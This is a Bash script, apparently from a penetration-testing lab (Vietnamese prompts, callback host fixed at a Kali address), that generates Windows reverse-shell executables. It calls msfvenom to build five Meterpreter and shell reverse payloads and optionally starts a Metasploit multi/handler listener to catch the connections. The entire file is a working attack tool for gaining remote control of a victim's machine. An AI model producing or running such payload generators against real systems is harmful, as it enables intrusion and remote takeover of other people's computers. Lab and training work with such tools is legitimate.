#!/bin/bash


BLUE='\033[0;34m'
NC='\033[0m'
target=0

echo -e "${BLUE}Gaining Shell with Metasploit${NC}"

# Tên tệp lưu kết quả
result_file_wes="netcat.txt"

start_metasploit() {
    local LHOST=$1
    local LPORT=$2
    local PAYLOAD=$3

    if ! command -v msfconsole &> /dev/null; then
        echo "Metasploit không được cài đặt. Hãy cài đặt và thử lại!"
        exit 1
    fi

    msfconsole -q -x "use exploit/multi/handler;
                    set payload $PAYLOAD;
                    set LHOST $LHOST;
                    set LPORT $LPORT;
                    exploit"
}


#----------------------------CHON CHUC NANG -------------------------------------
optionScan(){
   		echo -e "${BLUE}----------------------------CREATE REVERSE SHELL-------------------------------------${NC}"
   		echo -e "\e[1mChon Payload muon su dung\e[0m"
   		echo "1. windows/meterpreter/reverse_tcp"
   		echo "2. windows/meterpreter/reverse_http" 
   		echo "3. windows/x64/meterpreter_reverse_https"
   		echo "4. windows/x64/meterpreter_reverse_tcp"
   		echo "5. windows/x64/shell_reverse_tcp"
		echo "99. Back"
		echo -e "${BLUE}----------------------------CREATE REVERSE SHELL-------------------------------------${NC}"
		echo ""
		echo ""
	  }


#----------------------------CHON CHUC NANG-------------------------------------
if [ "$target" = "0" ]; then
       echo -n "Nhap IP muc tieu [IP hoac domain]: "
       read target
    fi
while :
do
    
    optionScan
    echo -n "CHON PAYLOAD: "
    yourOption=0
    while [ "$yourOption" = 0 ]; do
        read yourOption
    
    
    case $yourOption in        
        1)
            # windows/meterpreter/reverse_tcp      		       
				kali_ip="192.168.133.129"
				echo -e "\e[1mNhap Port:\e[0m" 
				read kali_port
				echo -e "\e[1mDang tao payload...\e[0m"
				sleep 2
				payload="windows/meterpreter/reverse_tcp"
				msfvenom -p windows/meterpreter/reverse_tcp LHOST=$kali_ip LPORT=$kali_port -f exe -o msf_payload/meterpreter_reverse_tcp.exe
				echo  "Tao payload meterpreter_reverse_tcp.exe thanh cong! Co the xem trong thu muc payload_msf."
					while true; do
					echo "Ban muon tao Listener hay khong? (Y/N)" 
					read choice
					choice=$(echo "$choice" | tr '[:upper:]' '[:lower:]')

					case "$choice" in
					    y)
						echo "Dang lang nghe tren cong $kali_port..."
                                                start_metasploit "$kali_ip" "$kali_port" "$payload"
						break
						;;
					    n)
						break
						exit 0
						;;
					    *)
						echo "Nhập không hợp lệ. Hãy nhập Y/y hoặc N/n."
						;;
					esac
				    done
		;;
 	2) 
 	    # windows/meterpreter/reverse_http
 	                       kali_ip="192.168.133.129"
				echo -e "\e[1mNhap Port:\e[0m" 
				read kali_port
				echo -e "\e[1mDang tao payload...\e[0m"
				sleep 2
				payload="windows/meterpreter/reverse_http"
				msfvenom -p $payload LHOST=$kali_ip LPORT=$kali_port -f exe -o msf_payload/meterpreter_reverse_http.exe
				echo  "Tao payload meterpreter_reverse_http.exe thanh cong! Co the xem trong thu muc payload_msf."
					while true; do
					echo "Ban muon tao Listener hay khong? (Y/N)" 
					read choice
					choice=$(echo "$choice" | tr '[:upper:]' '[:lower:]')

					case "$choice" in
					    y)
						echo "Dang lang nghe tren cong $kali_port..."
                                                start_metasploit "$kali_ip" "$kali_port" "$payload"
						break
						;;
					    n)
						break
						exit 0
						;;
					    *)
						echo "Nhập không hợp lệ. Hãy nhập Y/y hoặc N/n."
						;;
					esac
				    done
				
		;;
 	3) 
 	    # windows/x64/meterpreter_reverse_https
 	                       kali_ip="192.168.133.129"
				echo -e "\e[1mNhap Port:\e[0m" 
				read kali_port
				echo -e "\e[1mDang tao payload...\e[0m"
				sleep 2
				payload="windows/x64/meterpreter_reverse_https"
				msfvenom -p $payload LHOST=$kali_ip LPORT=$kali_port -f exe -o msf_payload/meterpreter_reverse_https.exe
				echo  "Tao payload meterpreter_reverse_https thanh cong! Co the xem trong thu muc payload_msf."
					while true; do
					echo "Ban muon tao Listener hay khong? (Y/N)" 
					read choice
					choice=$(echo "$choice" | tr '[:upper:]' '[:lower:]')

					case "$choice" in
					    y)
						echo "Dang lang nghe tren cong $kali_port..."
                                                start_metasploit "$kali_ip" "$kali_port" "$payload"
						break
						;;
					    n)
						break
						exit 0
						;;
					    *)
						echo "Nhập không hợp lệ. Hãy nhập Y/y hoặc N/n."
						;;
					esac
				    done
				
		;;
	4) 
 	    # windows/x64/meterpreter_reverse_tcp
 	                       kali_ip="192.168.133.129"
				echo -e "\e[1mNhap Port:\e[0m" 
				read kali_port
				echo -e "\e[1mDang tao payload...\e[0m"
				sleep 2
				payload="windows/x64/meterpreter_reverse_tcp"
				msfvenom -p $payload LHOST=$kali_ip LPORT=$kali_port -f exe -o msf_payload/meterpreter_reverse_tcp.exe
				echo  "Tao payload meterpreter_reverse_tcp.exe thanh cong! Co the xem trong thu muc payload_msf."
					while true; do
					echo "Ban muon tao Listener hay khong? (Y/N)" 
					read choice
					choice=$(echo "$choice" | tr '[:upper:]' '[:lower:]')

					case "$choice" in
					    y)
						echo "Dang lang nghe tren cong $kali_port..."
                                                start_metasploit "$kali_ip" "$kali_port" "$payload"
						break
						;;
					    n)
						break
						exit 0
						;;
					    *)
						echo "Nhập không hợp lệ. Hãy nhập Y/y hoặc N/n."
						;;
					esac
				    done
				
		;;
	5) 
 	    # windows/x64/shell_reverse_tcp
 	                       kali_ip="192.168.133.129"
				echo -e "\e[1mNhap Port:\e[0m" 
				read kali_port
				echo -e "\e[1mDang tao payload...\e[0m"
				sleep 2
				payload="windows/x64/shell_reverse_tcp"
				msfvenom -p $payload LHOST=$kali_ip LPORT=$kali_port -f exe -o msf_payload/shell_reverse_tcp.exe
				echo  "Tao payload shell_reverse_tcp.exe thanh cong! Co the xem trong thu muc payload_msf."
					while true; do
					echo "Ban muon tao Listener hay khong? (Y/N)" 
					read choice
					choice=$(echo "$choice" | tr '[:upper:]' '[:lower:]')

					case "$choice" in
					    y)
						echo "Dang lang nghe tren cong $kali_port..."
                                                start_metasploit "$kali_ip" "$kali_port" "$payload"
						break
						;;
					    n)
						break
						exit 0
						;;
					    *)
						echo "Nhập không hợp lệ. Hãy nhập Y/y hoặc N/n."
						;;
					esac
				    done
				
		;;    
     	99) f_main
     	;;
     	*) echo "Lua chon khong hop le!!. Vui long nhap lai."
     	;;
     	esac
     done
done

